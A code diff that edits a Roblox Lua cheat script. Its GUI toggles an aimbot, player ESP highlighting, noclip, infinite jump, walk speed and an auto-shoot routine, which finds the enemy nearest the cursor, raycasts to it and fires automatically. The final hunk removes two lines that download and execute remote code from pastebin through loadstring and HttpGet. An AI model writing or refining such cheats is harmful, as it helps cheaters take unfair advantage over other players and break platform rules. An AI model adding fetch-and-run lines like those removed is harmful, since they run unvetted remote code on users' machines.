@@ -53,20 +53,20 @@ local LERP_FACTOR = 0.2
 
 local ThemeColors = {
     Dark = {
-        Background = Color3.fromRGB(0, 0, 0),        -- Black
-        Panel = Color3.fromRGB(15, 15, 15),           -- Darker Gray
-        Accent = Color3.fromRGB(100, 100, 100),       -- Darker Gray
-        Highlight = Color3.fromRGB(150, 150, 150),    -- Slightly Darker Light Gray
-        Text = Color3.fromRGB(255, 255, 255),         -- White
-        Danger = Color3.fromRGB(255, 255, 255)        -- White (for danger elements)
+        Background = Color3.fromRGB(0, 0, 0),
+        Panel = Color3.fromRGB(15, 15, 15),
+        Accent = Color3.fromRGB(100, 100, 100),
+        Highlight = Color3.fromRGB(150, 150, 150),
+        Text = Color3.fromRGB(255, 255, 255),
+        Danger = Color3.fromRGB(255, 255, 255)
     },
     Light = {
-        Background = Color3.fromRGB(255, 255, 255),   -- White
-        Panel = Color3.fromRGB(230, 230, 230),        -- Light Gray
-        Accent = Color3.fromRGB(128, 128, 128),       -- Gray
-        Highlight = Color3.fromRGB(100, 100, 100),    -- Dark Gray
-        Text = Color3.fromRGB(0, 0, 0),               -- Black
-        Danger = Color3.fromRGB(0, 0, 0)              -- Black (for danger elements)
+        Background = Color3.fromRGB(255, 255, 255),   
+        Panel = Color3.fromRGB(230, 230, 230),        
+        Accent = Color3.fromRGB(128, 128, 128),       
+        Highlight = Color3.fromRGB(100, 100, 100),    
+        Text = Color3.fromRGB(0, 0, 0),               
+        Danger = Color3.fromRGB(0, 0, 0)              
     }
 }
 
@@ -398,9 +398,9 @@ local function createButton(parent, size, position, text, cornerRadius)
     button.Size = size
     button.Position = position
     button.Text = text
-    button.BackgroundColor3 = ThemeColors[CurrentTheme].Accent -- Default background color
+    button.BackgroundColor3 = ThemeColors[CurrentTheme].Accent 
     button.BackgroundTransparency = 0.3
-    button.TextColor3 = ThemeColors[CurrentTheme].Text -- Default text color
+    button.TextColor3 = ThemeColors[CurrentTheme].Text 
     button.TextSize = 14
     button.Font = Enum.Font.GothamSemibold
     button.AutoButtonColor = false
@@ -410,27 +410,24 @@ local function createButton(parent, size, position, text, cornerRadius)
     corner.CornerRadius = UDim.new(0, cornerRadius or 8)
     corner.Parent = button
 
-    -- Hover effect
     button.MouseEnter:Connect(function()
         TweenService:Create(button, TweenInfo.new(0.3), {
-            BackgroundColor3 = Color3.fromRGB(255, 255, 255), -- White background on hover
-            TextColor3 = Color3.fromRGB(0, 0, 0), -- Black text on hover
+            BackgroundColor3 = Color3.fromRGB(255, 255, 255), 
+            TextColor3 = Color3.fromRGB(0, 0, 0), 
             BackgroundTransparency = 0.1,
             TextSize = 15
         }):Play()
     end)
 
-    -- Reset to default when not hovered
     button.MouseLeave:Connect(function()
         TweenService:Create(button, TweenInfo.new(0.3), {
-            BackgroundColor3 = ThemeColors[CurrentTheme].Accent, -- Default background color
-            TextColor3 = ThemeColors[CurrentTheme].Text, -- Default text color
+            BackgroundColor3 = ThemeColors[CurrentTheme].Accent, 
+            TextColor3 = ThemeColors[CurrentTheme].Text, 
             BackgroundTransparency = 0.3,
             TextSize = 14
         }):Play()
     end)
 
-    -- Button press effect
     button.MouseButton1Down:Connect(function()
         TweenService:Create(button, TweenInfo.new(0.1), {
             Size = size - UDim2.new(0, 4, 0, 4),
@@ -496,7 +493,6 @@ local AimbotStatus, AimbotIcon = createStatusIndicator(SidePanel, UDim2.new(0.1,
 local AutoShootStatus, AutoShootIcon = createStatusIndicator(SidePanel, UDim2.new(0.1, 0, 0.45, 0), "🔫", "Auto Shoot: Off", ACTIVE_FEATURES_ELEMENT_HEIGHT)
 local NoClipStatus, NoClipIcon = createStatusIndicator(SidePanel, UDim2.new(0.1, 0, 0.55, 0), "🚀", "NoClip: Off", ACTIVE_FEATURES_ELEMENT_HEIGHT)
 local WalkSpeedStatus, WalkSpeedIcon = createStatusIndicator(SidePanel, UDim2.new(0.1, 0, 0.65, 0), "🏃", "WalkSpeed: Off", ACTIVE_FEATURES_ELEMENT_HEIGHT)
-
 
 local SettingsButton = createButton(ScreenGui, UDim2.new(0, 110, 0, 40), UDim2.new(0.9, -120, 0.05, 0), "Settings")
 
@@ -739,8 +735,8 @@ local function createESP(player)
 
 local highlight = Instance.new("Highlight")
 highlight.Adornee = player.Character
-highlight.FillColor = Color3.new(0, 0, 0)  -- Black
-highlight.OutlineColor = Color3.new(1, 1, 1)  -- White
+highlight.FillColor = Color3.new(0, 0, 0)  
+highlight.OutlineColor = Color3.new(1, 1, 1)  
 highlight.FillTransparency = 0.5
 highlight.OutlineTransparency = 0.3
 highlight.Parent = player.Character
@@ -848,15 +844,16 @@ espToggle:GetChildren()[2].InputBegan:Connect(function(input)
 end)
 
 local function enableNoclip()
-    RunService.Stepped:Connect(function()
-        if NoClipEnabled then
-            for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
-                if part:IsA("BasePart") then
-                    part.CanCollide = false
-                end
+    local character = LocalPlayer.Character
+    if character then
+        for _, part in pairs(character:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.CanCollide = false
+                part.Velocity = Vector3.zero
+                part.RotVelocity = Vector3.zero
             end
         end
-    end)
+    end
 end
 
 local function disableNoclip()
@@ -1015,11 +1012,11 @@ updateCanvasSize()
 
 local function updateSensitivity()
     local input = tonumber(SensitivityTextBox.Text)
-    if input and input >= 0.1 and input <= 5 then
+    if input and input >= 0.000000001 and input <= 5 then
         SENSITIVITY_MULTIPLIER = input
-        SensitivityLabel.Text = "Aimbot Sensitivity: " .. string.format("%.2f", SENSITIVITY_MULTIPLIER)
+        SensitivityLabel.Text = "Aimbot Sensitivity: " .. string.format("%.9f", SENSITIVITY_MULTIPLIER)
     else
-        SensitivityTextBox.Text = tostring(SENSITIVITY_MULTIPLIER)
+        SensitivityTextBox.Text = tostring(SENSITIVITY_MULTIPLIER) 
     end
 end
 
@@ -1206,26 +1203,28 @@ aimbotToggle:GetChildren()[2].InputBegan:Connect(function(input)
         AimbotIcon.TextColor3 = (AimbotToggleEnabled and AimbotEnabled) and ThemeColors[CurrentTheme].Accent or Color3.fromRGB(150, 150, 150)
     end
 end)
-
 local function InfiniteJump()
-    if InfiniteJumpEnabled then
-        UserInputService.JumpRequest:Connect(function()
-            local character = LocalPlayer.Character
-            if character then
-                local humanoid = character:FindFirstChildOfClass("Humanoid")
-                if humanoid and humanoid:GetState() ~= Enum.HumanoidStateType.Dead then
-                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-                end
-            end
-        end)
-    else
+    if not InfiniteJumpEnabled then 
         if InfiniteJumpConnection then
             InfiniteJumpConnection:Disconnect()
             InfiniteJumpConnection = nil
         end
+        return 
     end
+    if InfiniteJumpConnection then
+        InfiniteJumpConnection:Disconnect()
+        InfiniteJumpConnection = nil
+    end
+    InfiniteJumpConnection = UserInputService.JumpRequest:Connect(function()
+        local character = LocalPlayer.Character
+        if character then
+            local humanoid = character:FindFirstChildOfClass("Humanoid")
+            if humanoid and humanoid:GetState() ~= Enum.HumanoidStateType.Dead then
+                humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+            end
+        end
+    end)
 end
-
 LocalPlayer.CharacterAdded:Connect(function()
     if InfiniteJumpEnabled then
         InfiniteJump()
@@ -1250,19 +1249,74 @@ InfiniteJumpToggle:GetChildren()[2].InputBegan:Connect(function(input)
 end)
 
 local function handleAutoShoot()
-    if AutoShootEnabled and Target then
-        local ray = Ray.new(
-            Camera.CFrame.Position,
-            (Target.Position - Camera.CFrame.Position).Unit * 1000
-        )
-        local hit, _ = workspace:FindPartOnRayWithIgnoreList(ray, {LocalPlayer.Character})
-        if hit and hit:IsDescendantOf(Target.Parent) then
-            mouse1press()
-        else
+    local currentTime = tick()
+    if not AutoShootEnabled then 
+        if UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) and AutoShootIsControllingMouse then
             mouse1release()
+            AutoShootIsControllingMouse = false
         end
-    else
-        mouse1release()
+        return 
+    end
+    if UserIsHoldingMouse then
+        AutoShootIsControllingMouse = false
+        return
+    end
+    if currentTime - lastTargetTime < 0.05 then
+        return
+    end
+    local mouseLocation = UserInputService:GetMouseLocation()
+    local isTargetDetected = false
+    local closestDistance = 100 
+    local closestPart = nil
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer and player.Character and LocalPlayer.Character and not isTeammate(player) and not isDead(player) then
+            local character = player.Character
+            local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+            local head = character:FindFirstChild("Head")
+            local partsToCheck = {head, humanoidRootPart}
+            for _, part in pairs(partsToCheck) do
+                if part and not isPartOfLocalPlayer(part) then
+                    local screenPosition, onScreen = Camera:WorldToViewportPoint(part.Position)
+                    if onScreen then
+                        local partScreenPosition = Vector2.new(screenPosition.X, screenPosition.Y)
+                        local mouseDistance = (partScreenPosition - mouseLocation).Magnitude
+                        if mouseDistance < closestDistance then
+                            closestDistance = mouseDistance
+                            closestPart = part
+                        end
+                    end
+                end
+            end
+        end
+    end
+    local wasTargetDetected = AutoShootIsControllingMouse
+    if closestPart then
+        local ray = Ray.new(
+            Camera.CFrame.Position, 
+            (closestPart.Position - Camera.CFrame.Position).Unit * 1000
+        )
+        local hit, position = workspace:FindPartOnRayWithIgnoreList(ray, {LocalPlayer.Character})
+        if hit and hit:IsDescendantOf(closestPart.Parent) and not isPartOfLocalPlayer(hit) then
+            isTargetDetected = true
+            lastTargetTime = currentTime
+            if not UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) then
+                mouse1press()
+                AutoShootIsControllingMouse = true
+            end
+        end
+    end
+    if not isTargetDetected and wasTargetDetected then
+        if not AutoShootCooldown then
+            AutoShootCooldown = true
+            spawn(function()
+                wait(0.2) 
+                if AutoShootIsControllingMouse and not isTargetDetected then
+                    mouse1release()
+                    AutoShootIsControllingMouse = false
+                end
+                AutoShootCooldown = false
+            end)
+        end
     end
 end
 
@@ -1418,6 +1472,3 @@ local function updateUI()
 end
 
 updateUI()
-
-loadstring(game:HttpGet("https://pastebin.com/raw/aHYKbmCK",true))()
-loadstring(game:HttpGet("https://pastebin.com/raw/M3JUrbmU",true))()
